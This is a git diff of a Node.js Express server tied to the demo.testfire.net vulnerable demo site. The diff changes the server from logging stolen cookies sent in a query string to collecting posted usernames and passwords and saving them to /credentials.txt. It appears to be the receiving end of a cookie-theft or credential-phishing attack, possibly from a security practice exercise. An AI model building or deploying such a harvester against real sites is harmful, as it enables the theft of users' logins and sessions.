@@ -3,7 +3,7 @@ const bodyParser = require('body-parser');
 const router = express.Router();
 const app = express();
 var cors = require('cors');
-
+var fs = require('fs');
 
 var corsOptions = {
   origin: 'https://demo.testfire.net',
@@ -18,17 +18,24 @@ router.get('/',(req,res) => {
     res.sendFile('index.html');
 });
 
-router.get('/getUser', cors(corsOptions) ,(req,res) => {
-    var cookie = req.query.cookie;
-    console.log(req.body);
-    fs.writeFile("/cookie.txt", cookie, function(err) {
+router.get('/getUser',(req,res) => {
+    res.json({'id' : 1, 'name': 'vijay'});
+});
+
+router.post('/gotUser',(req,res) => {
+    
+    console.log(req.url);
+    var username  = req.body.username;
+    var password  = req.body.password;
+    var data = "Username = "+ username+" password =" + password;
+    
+    fs.writeFile("/credentials.txt", data , function(err) {
 
         if(err) {
             return console.log(err);
         }
-    
-        console.log(cookie);
-        res.end();
+        console.log('Write Successful');
+        res.sendStatus(200)
     });  
 });
  
@@ -36,5 +43,5 @@ router.get('/getUser', cors(corsOptions) ,(req,res) => {
 app.use('/', router);
 
 app.listen(process.env.PORT || 8080,() => {
-    console.log(`App Started on PORT ${process.env.PORT || 3000}`);
+    console.log(`App Started on PORT ${process.env.PORT || 8080}`);
 });
